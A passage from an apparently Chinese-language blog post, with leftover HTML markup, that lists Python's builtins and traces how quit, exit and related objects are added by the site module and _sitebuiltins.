class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line">builtins name:__name__</span><br><span class="line">Built-<span class="keyword">in</span> functions, exceptions, and other objects.</span><br><span class="line"></span><br><span class="line"><span class="function">Noteworthy: <span class="title">None</span> <span class="title">is</span> <span class="title">the</span> `<span class="title">nil</span>' <span class="title">object</span>; <span class="title">Ellipsis</span> <span class="title">represents</span> `...' <span class="title">in</span> <span class="title">slices</span>. <span class="title">name:__doc__</span></span></span><br><span class="line"><span class="function"> <span class="title">name:__package__</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">_frozen_importlib.BuiltinImporter</span>'&gt; <span class="title">name:__loader__</span></span></span><br><span class="line"><span class="function"><span class="title">ModuleSpec</span>(<span class="title">name</span>='<span class="title">builtins</span>', <span class="title">loader</span>=&lt;<span class="title">class</span> '<span class="title">_frozen_importlib.BuiltinImporter</span>'&gt;, <span class="title">origin</span>='<span class="title">built</span>-<span class="title">in</span>') <span class="title">name:__spec__</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">__build_class__</span>&gt; <span class="title">name:__build_class__</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">__import__</span>&gt; <span class="title">name:__import__</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">abs</span>&gt; <span class="title">name:abs</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">all</span>&gt; <span class="title">name:all</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">any</span>&gt; <span class="title">name:any</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">ascii</span>&gt; <span class="title">name:ascii</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">bin</span>&gt; <span class="title">name:bin</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">breakpoint</span>&gt; <span class="title">name:breakpoint</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">callable</span>&gt; <span class="title">name:callable</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">chr</span>&gt; <span class="title">name:chr</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">compile</span>&gt; <span class="title">name:compile</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">delattr</span>&gt; <span class="title">name:delattr</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">dir</span>&gt; <span class="title">name:dir</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">divmod</span>&gt; <span class="title">name:divmod</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">eval</span>&gt; <span class="title">name:eval</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">exec</span>&gt; <span class="title">name:exec</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">format</span>&gt; <span class="title">name:format</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">getattr</span>&gt; <span class="title">name:getattr</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">globals</span>&gt; <span class="title">name:globals</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">hasattr</span>&gt; <span class="title">name:hasattr</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">hash</span>&gt; <span class="title">name:hash</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">hex</span>&gt; <span class="title">name:hex</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">id</span>&gt; <span class="title">name:id</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">input</span>&gt; <span class="title">name:input</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">isinstance</span>&gt; <span class="title">name:isinstance</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">issubclass</span>&gt; <span class="title">name:issubclass</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">iter</span>&gt; <span class="title">name:iter</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">aiter</span>&gt; <span class="title">name:aiter</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">len</span>&gt; <span class="title">name:len</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">locals</span>&gt; <span class="title">name:locals</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">max</span>&gt; <span class="title">name:max</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">min</span>&gt; <span class="title">name:min</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">next</span>&gt; <span class="title">name:next</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">anext</span>&gt; <span class="title">name:anext</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">oct</span>&gt; <span class="title">name:oct</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">ord</span>&gt; <span class="title">name:ord</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">pow</span>&gt; <span class="title">name:pow</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">print</span>&gt; <span class="title">name:print</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">repr</span>&gt; <span class="title">name:repr</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">round</span>&gt; <span class="title">name:round</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">setattr</span>&gt; <span class="title">name:setattr</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">sorted</span>&gt; <span class="title">name:sorted</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">sum</span>&gt; <span class="title">name:sum</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">vars</span>&gt; <span class="title">name:vars</span></span></span><br><span class="line"><span class="function"><span class="title">None</span> <span class="title">name:None</span></span></span><br><span class="line"><span class="function"><span class="title">Ellipsis</span> <span class="title">name:Ellipsis</span></span></span><br><span class="line"><span class="function"><span class="title">NotImplemented</span> <span class="title">name:NotImplemented</span></span></span><br><span class="line"><span class="function"><span class="title">False</span> <span class="title">name:False</span></span></span><br><span class="line"><span class="function"><span class="title">True</span> <span class="title">name:True</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">bool</span>'&gt; <span class="title">name:bool</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">memoryview</span>'&gt; <span class="title">name:memoryview</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">bytearray</span>'&gt; <span class="title">name:bytearray</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">bytes</span>'&gt; <span class="title">name:bytes</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">classmethod</span>'&gt; <span class="title">name:classmethod</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">complex</span>'&gt; <span class="title">name:complex</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">dict</span>'&gt; <span class="title">name:dict</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">enumerate</span>'&gt; <span class="title">name:enumerate</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">filter</span>'&gt; <span class="title">name:filter</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">float</span>'&gt; <span class="title">name:float</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">frozenset</span>'&gt; <span class="title">name:frozenset</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">property</span>'&gt; <span class="title">name:property</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">int</span>'&gt; <span class="title">name:int</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">list</span>'&gt; <span class="title">name:list</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">map</span>'&gt; <span class="title">name:map</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">object</span>'&gt; <span class="title">name:object</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">range</span>'&gt; <span class="title">name:range</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">reversed</span>'&gt; <span class="title">name:reversed</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">set</span>'&gt; <span class="title">name:set</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">slice</span>'&gt; <span class="title">name:slice</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">staticmethod</span>'&gt; <span class="title">name:staticmethod</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">str</span>'&gt; <span class="title">name:str</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">super</span>'&gt; <span class="title">name:super</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">tuple</span>'&gt; <span class="title">name:tuple</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">type</span>'&gt; <span class="title">name:type</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">zip</span>'&gt; <span class="title">name:zip</span></span></span><br><span class="line"><span class="function"><span class="title">True</span> <span class="title">name:__debug__</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">BaseException</span>'&gt; <span class="title">name:BaseException</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">Exception</span>'&gt; <span class="title">name:Exception</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">TypeError</span>'&gt; <span class="title">name:TypeError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">StopAsyncIteration</span>'&gt; <span class="title">name:StopAsyncIteration</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">StopIteration</span>'&gt; <span class="title">name:StopIteration</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">GeneratorExit</span>'&gt; <span class="title">name:GeneratorExit</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">SystemExit</span>'&gt; <span class="title">name:SystemExit</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">KeyboardInterrupt</span>'&gt; <span class="title">name:KeyboardInterrupt</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">ImportError</span>'&gt; <span class="title">name:ImportError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">ModuleNotFoundError</span>'&gt; <span class="title">name:ModuleNotFoundError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">OSError</span>'&gt; <span class="title">name:OSError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">OSError</span>'&gt; <span class="title">name:EnvironmentError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">OSError</span>'&gt; <span class="title">name:IOError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">EOFError</span>'&gt; <span class="title">name:EOFError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">RuntimeError</span>'&gt; <span class="title">name:RuntimeError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">RecursionError</span>'&gt; <span class="title">name:RecursionError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">NotImplementedError</span>'&gt; <span class="title">name:NotImplementedError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">NameError</span>'&gt; <span class="title">name:NameError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">UnboundLocalError</span>'&gt; <span class="title">name:UnboundLocalError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">AttributeError</span>'&gt; <span class="title">name:AttributeError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">SyntaxError</span>'&gt; <span class="title">name:SyntaxError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">IndentationError</span>'&gt; <span class="title">name:IndentationError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">TabError</span>'&gt; <span class="title">name:TabError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">LookupError</span>'&gt; <span class="title">name:LookupError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">IndexError</span>'&gt; <span class="title">name:IndexError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">KeyError</span>'&gt; <span class="title">name:KeyError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">ValueError</span>'&gt; <span class="title">name:ValueError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">UnicodeError</span>'&gt; <span class="title">name:UnicodeError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">UnicodeEncodeError</span>'&gt; <span class="title">name:UnicodeEncodeError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">UnicodeDecodeError</span>'&gt; <span class="title">name:UnicodeDecodeError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">UnicodeTranslateError</span>'&gt; <span class="title">name:UnicodeTranslateError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">AssertionError</span>'&gt; <span class="title">name:AssertionError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">ArithmeticError</span>'&gt; <span class="title">name:ArithmeticError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">FloatingPointError</span>'&gt; <span class="title">name:FloatingPointError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">OverflowError</span>'&gt; <span class="title">name:OverflowError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">ZeroDivisionError</span>'&gt; <span class="title">name:ZeroDivisionError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">SystemError</span>'&gt; <span class="title">name:SystemError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">ReferenceError</span>'&gt; <span class="title">name:ReferenceError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">MemoryError</span>'&gt; <span class="title">name:MemoryError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">BufferError</span>'&gt; <span class="title">name:BufferError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">Warning</span>'&gt; <span class="title">name:Warning</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">UserWarning</span>'&gt; <span class="title">name:UserWarning</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">EncodingWarning</span>'&gt; <span class="title">name:EncodingWarning</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">DeprecationWarning</span>'&gt; <span class="title">name:DeprecationWarning</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">PendingDeprecationWarning</span>'&gt; <span class="title">name:PendingDeprecationWarning</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">SyntaxWarning</span>'&gt; <span class="title">name:SyntaxWarning</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">RuntimeWarning</span>'&gt; <span class="title">name:RuntimeWarning</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">FutureWarning</span>'&gt; <span class="title">name:FutureWarning</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">ImportWarning</span>'&gt; <span class="title">name:ImportWarning</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">UnicodeWarning</span>'&gt; <span class="title">name:UnicodeWarning</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">BytesWarning</span>'&gt; <span class="title">name:BytesWarning</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">ResourceWarning</span>'&gt; <span class="title">name:ResourceWarning</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">ConnectionError</span>'&gt; <span class="title">name:ConnectionError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">BlockingIOError</span>'&gt; <span class="title">name:BlockingIOError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">BrokenPipeError</span>'&gt; <span class="title">name:BrokenPipeError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">ChildProcessError</span>'&gt; <span class="title">name:ChildProcessError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">ConnectionAbortedError</span>'&gt; <span class="title">name:ConnectionAbortedError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">ConnectionRefusedError</span>'&gt; <span class="title">name:ConnectionRefusedError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">ConnectionResetError</span>'&gt; <span class="title">name:ConnectionResetError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">FileExistsError</span>'&gt; <span class="title">name:FileExistsError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">FileNotFoundError</span>'&gt; <span class="title">name:FileNotFoundError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">IsADirectoryError</span>'&gt; <span class="title">name:IsADirectoryError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">NotADirectoryError</span>'&gt; <span class="title">name:NotADirectoryError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">InterruptedError</span>'&gt; <span class="title">name:InterruptedError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">PermissionError</span>'&gt; <span class="title">name:PermissionError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">ProcessLookupError</span>'&gt; <span class="title">name:ProcessLookupError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">TimeoutError</span>'&gt; <span class="title">name:TimeoutError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">open</span>&gt; <span class="title">name:open</span></span></span><br><span class="line"><span class="function"><span class="title">Use</span> <span class="title">quit</span>() <span class="title">or</span> <span class="title">Ctrl</span>-<span class="title">D</span> (<span class="title">i.e</span>. <span class="title">EOF</span>) <span class="title">to</span> <span class="title">exit</span> <span class="title">name:quit</span></span></span><br><span class="line"><span class="function"><span class="title">Use</span> <span class="title">exit</span>() <span class="title">or</span> <span class="title">Ctrl</span>-<span class="title">D</span> (<span class="title">i.e</span>. <span class="title">EOF</span>) <span class="title">to</span> <span class="title">exit</span> <span class="title">name:exit</span></span></span><br><span class="line"><span class="function"><span class="title">Copyright</span> (<span class="title">c</span>) 2001-2022 <span class="title">Python</span> <span class="title">Software</span> <span class="title">Foundation</span>.</span></span><br><span class="line"><span class="function"><span class="title">All</span> <span class="title">Rights</span> <span class="title">Reserved</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Copyright</span> (<span class="title">c</span>) 2000 <span class="title">BeOpen.com</span>.</span></span><br><span class="line"><span class="function"><span class="title">All</span> <span class="title">Rights</span> <span class="title">Reserved</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Copyright</span> (<span class="title">c</span>) 1995-2001 <span class="title">Corporation</span> <span class="title">for</span> <span class="title">National</span> <span class="title">Research</span> <span class="title">Initiatives</span>.</span></span><br><span class="line"><span class="function"><span class="title">All</span> <span class="title">Rights</span> <span class="title">Reserved</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Copyright</span> (<span class="title">c</span>) 1991-1995 <span class="title">Stichting</span> <span class="title">Mathematisch</span> <span class="title">Centrum</span>, <span class="title">Amsterdam</span>.</span></span><br><span class="line"><span class="function"><span class="title">All</span> <span class="title">Rights</span> <span class="title">Reserved</span>. <span class="title">name:copyright</span></span></span><br><span class="line"><span class="function">    <span class="title">Thanks</span> <span class="title">to</span> <span class="title">CWI</span>, <span class="title">CNRI</span>, <span class="title">BeOpen.com</span>, <span class="title">Zope</span> <span class="title">Corporation</span> <span class="title">and</span> <span class="title">a</span> <span class="title">cast</span> <span class="title">of</span> <span class="title">thousands</span></span></span><br><span class="line"><span class="function">    <span class="title">for</span> <span class="title">supporting</span> <span class="title">Python</span> <span class="title">development</span>.  <span class="title">See</span> <span class="title">www.python.org</span> <span class="title">for</span> <span class="title">more</span> <span class="title">information</span>. <span class="title">name:credits</span></span></span><br><span class="line"><span class="function"><span class="title">Type</span> <span class="title">license</span>() <span class="title">to</span> <span class="title">see</span> <span class="title">the</span> <span class="title">full</span> <span class="title">license</span> <span class="title">text</span> <span class="title">name:license</span></span></span><br><span class="line"><span class="function"><span class="title">Type</span> <span class="title">help</span>() <span class="title">for</span> <span class="title">interactive</span> <span class="title">help</span>, <span class="title">or</span> <span class="title">help</span>(<span class="title">object</span>) <span class="title">for</span> <span class="title">help</span> <span class="title">about</span> <span class="title">object</span>. <span class="title">name:help</span></span></span><br></pre></td></tr></table></figure><p><code>quit()  exit() licnese() help()</code>四个函数，并没有显现”&lt; xxx  ‘xxxx’ &gt;” 而是像被调用执行后返回一个字符串。</p><h3 id="内鬼-sitebuiltins"><a href="#内鬼-sitebuiltins" class="headerlink" title="内鬼_sitebuiltins"></a>内鬼_sitebuiltins</h3><p>我以quit为突破口，深入研究下python 手册与python 源码。</p><p>在python 手册内置常量（<a href="https://docs.python.org/zh-cn/3/library/constants.html#built-in-consts）这一节发现一个有意思的描述：" target="_blank" rel="noopener">https://docs.python.org/zh-cn/3/library/constants.html#built-in-consts）这一节发现一个有意思的描述：</a></p><blockquote><h2 id="由-site-模块添加的常量"><a href="#由-site-模块添加的常量" class="headerlink" title="由 site 模块添加的常量"></a>由 <a href="https://docs.python.org/zh-cn/3/library/site.html#module-site" target="_blank" rel="noopener"><code>site</code></a> 模块添加的常量</h2><p><a href="https://docs.python.org/zh-cn/3/library/site.html#module-site" target="_blank" rel="noopener"><code>site</code></a> 模块（在启动期间自动导入，除非给出 <a href="https://docs.python.org/zh-cn/3/using/cmdline.html#cmdoption-S" target="_blank" rel="noopener"><code>-S</code></a> 命令行选项）将几个常量添加到内置命名空间。 它们对交互式解释器 shell 很有用，并且不应在程序中使用。</p><ul><li><p><strong>quit</strong>(<em>code=None</em>)</p></li><li><p><strong>exit</strong>(<em>code=None</em>)</p><p>当打印此对象时，会打印出一条消息，例如“Use quit() or Ctrl-D (i.e. EOF) to exit”，当调用此对象时，将使用指定的退出代码来引发 <a href="https://docs.python.org/zh-cn/3/library/exceptions.html#SystemExit" target="_blank" rel="noopener"><code>SystemExit</code></a>。</p></li><li><p><strong>copyright</strong></p></li><li><p><strong>credits</strong></p><p>打印或调用的对象分别打印版权或作者的文本。</p></li><li><p><strong>license</strong></p><p>当打印此对象时，会打印出一条消息“Type license() to see the full license text”，当调用此对象时，将以分页形式显示完整的许可证文本（每次显示一屏）。</p></li></ul></blockquote><p>quit 这些函数是用site模块添加的方法。</p><p>根据site模块，发现手册中提供了site模块的源码地址 <a href="https://github.com/python/cpython/tree/3.11/Lib/site.py" target="_blank" rel="noopener">Lib/site.py</a></p><p>在源码中发现了一个有意思的代码块：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setquit</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""Define new builtins 'quit' and 'exit'.</span></span><br><span class="line"><span class="string">    These are objects which make the interpreter exit when called.</span></span><br><span class="line"><span class="string">    The repr of each object contains a hint at how it works.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> os.sep == <span class="string">'\\'</span>:</span><br><span class="line">        eof = <span class="string">'Ctrl-Z plus Return'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        eof = <span class="string">'Ctrl-D (i.e. EOF)'</span></span><br><span class="line"></span><br><span class="line">    builtins.quit = _sitebuiltins.Quitter(<span class="string">'quit'</span>, eof)</span><br><span class="line">    builtins.exit = _sitebuiltins.Quitter(<span class="string">'exit'</span>, eof)</span><br></pre></td></tr></table></figure><p>builtins.quit居然是``_sitebuiltins.Quitter <code>类的实例。继续根据_</code>sitebuiltins.Quitter`源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 